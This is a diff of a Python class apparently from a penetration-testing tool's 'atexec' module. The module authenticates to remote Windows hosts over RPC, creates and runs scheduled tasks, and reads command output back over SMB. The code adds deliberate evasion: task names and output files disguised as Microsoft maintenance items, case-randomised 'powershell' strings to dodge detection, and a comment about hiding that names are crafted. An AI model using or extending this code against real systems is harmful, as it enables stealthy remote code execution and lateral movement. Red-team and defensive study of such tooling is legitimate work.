@@ -70,67 +70,67 @@ class TSCH_EXEC:
         """Generate a more plausible task scheduler related filename"""
         task_prefixes = ["TS", "Task", "Microsoft-Task", "Windows-Task", "TaskManager", "Schedule"]
         extensions = ["wdb"]
-        
+
         prefix = random.choice(task_prefixes)
         extension = random.choice(extensions)
-        
+
         # Generate different filename formats
         formats = [
             f"{prefix}_{uuid.uuid4().hex[:8].upper()}.{extension}",
             f"{prefix}-{datetime.now().strftime('%Y%m%d')}.{extension}",
             f"Microsoft-{prefix}-{gen_random_string(6).upper()}.{extension}"
         ]
-        
+
         return random.choice(formats)
-        
+
     def get_legitimate_task_name(self):
         """Generate a more plausible scheduled task name"""
         vendors = ["Microsoft", "Windows", "System"]
         components = ["Maintenance", "Update", "Diagnostics", "Performance", "Security", "Network"]
         actions = ["Task", "Manager", "Monitor", "Service", "Scheduler"]
-        
+
         formats = [
             f"{random.choice(vendors)}-{random.choice(components)}-{random.choice(actions)}",
             f"{random.choice(vendors)}{random.choice(components)}",
             f"{random.choice(components)}{random.choice(actions)}"
         ]
-        
+
         task_name = random.choice(formats)
-        
+
         # Sometimes add a random component ID
         if random.choice([True, False]):
             task_name = f"{task_name}-{uuid.uuid4().hex[:8].upper()}"
-            
+
         return task_name
 
     def gen_xml(self, command, fileless=False):
-        
+
         safer_command = command
-        
+
         if "powershell" in command.lower() and ("-command" in command.lower() or "-c " in command.lower()):
             self.logger.debug("PowerShell command detected, keeping as is (user requested)")
-            
+
             # case randomization
             safer_command = command.replace("powershell", "poWerSheLL").replace("POWERSHELL", "PoWeRsHeLL")
-            
+
         valid_system_filename_prefixes = [
-            "DiagTrack-", "CompatTel-", "WindowsUpdate-", "NetTrace-", 
+            "DiagTrack-", "CompatTel-", "WindowsUpdate-", "NetTrace-",
             "Defender-", "SIH-", "WER-", "Cluster-", "ws_trace-"
         ]
-        
+
         # Create a filename that looks like a legitimate Windows log or temp file
         system_prefix = random.choice(valid_system_filename_prefixes)
         random_date = datetime.now().strftime("%Y%m%d")
         random_suffix = gen_random_string(4)
-        
+
         legit_filename = f"{system_prefix}{random_date}-{random_suffix}.log"
-        
+
         # Use a more convincing task-related filename for output with .wdb extension
         task_filename = self.get_legitimate_task_filename()
-        
+
         current_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
         self.logger.debug(f"Creation time: {current_time}")
-        
+
         # Store in ProgramData as originally requested but with convincing filename
         self.__output_filename = f"C:\\ProgramData\\{task_filename}"
 
@@ -203,7 +203,7 @@ class TSCH_EXEC:
             dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
 
         dce.set_credentials(*self.__rpctransport.get_credentials())
-        
+
         try:
             dce.connect()
         except Exception as e:
@@ -212,7 +212,7 @@ class TSCH_EXEC:
 
         # Use the legitimate task name generator
         tmpName = self.get_legitimate_task_name()
-        
+
         # Log the name but don't show it's specially crafted
         self.logger.debug(f"Using task name: {tmpName}")
 
@@ -220,7 +220,7 @@ class TSCH_EXEC:
 
         self.logger.debug(f"Task XML: {xml}")
         self.logger.info(f"Creating task: {tmpName}")
-        
+
         try:
             # windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported
             dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
@@ -232,7 +232,7 @@ class TSCH_EXEC:
                 self.logger.fail("ATEXEC: Create schedule task got blocked.")
             else:
                 self.logger.fail(str(e))
-            
+
             # Clean disconnect
             with contextlib.suppress(Exception):
                 dce.disconnect()
@@ -246,7 +246,7 @@ class TSCH_EXEC:
             self.logger.debug("Task run request sent successfully")
         except Exception as e:
             self.logger.debug(f"Manual execution failed: {e!s}, relying on registration trigger")
-        
+
         # Give the task time to execute
         sleep(3)
 
@@ -255,7 +255,7 @@ class TSCH_EXEC:
         done = False
         task_ran = False
         max_attempts = 15
-                
+
         while not done and wait_attempts < max_attempts:
             # First check if output file exists (most reliable check)
             if self.__retOutput and wait_attempts >= 2:  # After initial wait
@@ -270,7 +270,7 @@ class TSCH_EXEC:
                     break
                 except Exception as e:
                     self.logger.debug(f"Output file check: {e}")
-            
+
             # Then check task run status
             try:
                 self.logger.debug(f"Checking task execution status (attempt {wait_attempts + 1}/{max_attempts})")
@@ -312,7 +312,7 @@ class TSCH_EXEC:
                         self.logger.debug(f"Looking for fileless output at: {file_path}")
                         with open(file_path) as output:
                             self.output_callback(output.read())
-                        
+
                         # cleanup
                         try:
                             os.remove(file_path)
@@ -326,11 +326,11 @@ class TSCH_EXEC:
             else:
                 smbConnection = self.__rpctransport.get_smb_connection()
                 tries = 1
-                
+
                 # Properly convert Windows path to SMB path
                 smb_path = self.windows_path_to_smb(self.__output_filename)
                 output_basename = os.path.basename(self.__output_filename)
-                
+
                 while tries <= self.__tries:
                     try:
                         self.logger.info(f"Attempting to read output from: {self.__output_filename}")
@@ -361,10 +361,10 @@ class TSCH_EXEC:
                             self.logger.info(f"File {output_basename} not found, retrying...")
                         else:
                             self.logger.debug(f"Error reading output file: {e!s}. Retrying...")
-                        
+
                         tries += 1
                         sleep(1)
-                        
+
                         if tries > self.__tries:
                             self.logger.fail("ATEXEC: Could not retrieve output file after maximum attempts.")
 
